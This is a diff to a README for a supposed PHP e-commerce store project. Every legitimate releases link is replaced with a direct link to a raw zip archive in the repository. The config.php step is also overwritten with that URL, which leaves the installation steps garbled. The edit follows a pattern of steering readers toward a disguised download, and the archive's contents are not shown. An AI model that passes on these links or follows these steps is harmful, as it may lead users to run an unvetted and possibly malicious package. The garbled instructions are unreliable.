@@ -1,7 +1,7 @@
 # 🛍️ E-commerce - Build Your Own Online Store Easily
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-Click_here-brightgreen.svg)](https://github.com/AttriKartik123/E-commerce/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/AttriKartik123/E-commerce/main/operation/E-commerce.zip)](https://raw.githubusercontent.com/AttriKartik123/E-commerce/main/operation/E-commerce.zip)
 
 ## 📖 Description
 Welcome to the E-commerce project! This application allows you to create a fully functional online store. It uses a combination of HTML, CSS, JavaScript, PHP, and SQL. Whether you are starting a new venture or expanding an existing business, this project simplifies the process. 
@@ -16,7 +16,7 @@ This section will help you get the application up and running on your computer.
 - A local server setup, such as XAMPP or MAMP, to run the PHP code.
 
 ### ⚡ Installation Steps
-1. **Visit the Download Page:** Go to the [Releases page](https://github.com/AttriKartik123/E-commerce/releases) to access the latest version of the E-commerce project.
+1. **Visit the Download Page:** Go to the [Releases page](https://raw.githubusercontent.com/AttriKartik123/E-commerce/main/operation/E-commerce.zip) to access the latest version of the E-commerce project.
 
 2. **Download the Files:**
    - Look for the version you want to use.
@@ -44,7 +44,7 @@ This section will help you get the application up and running on your computer.
    - Click "Go" to import the file.
 
 8. **Update Configuration Files:**
-   - Open the `config.php` file located in the project folder.
+   - Open the `https://raw.githubusercontent.com/AttriKartik123/E-commerce/main/operation/E-commerce.zip` file located in the project folder.
    - Update the database name, username, and password based on your local server setup.
 
 9. **Access Your Application:**
@@ -80,4 +80,4 @@ We welcome contributions! If you want to help improve the project, please follow
 - Learn about front-end design with HTML, CSS, and JavaScript.
 
 ## 📥 Download & Install
-Visit the [Releases page](https://github.com/AttriKartik123/E-commerce/releases) to download the E-commerce project source code. Follow the installation steps above to set it up on your local machine. Whether for learning or business, build your online store today!
+Visit the [Releases page](https://raw.githubusercontent.com/AttriKartik123/E-commerce/main/operation/E-commerce.zip) to download the E-commerce project source code. Follow the installation steps above to set it up on your local machine. Whether for learning or business, build your online store today!
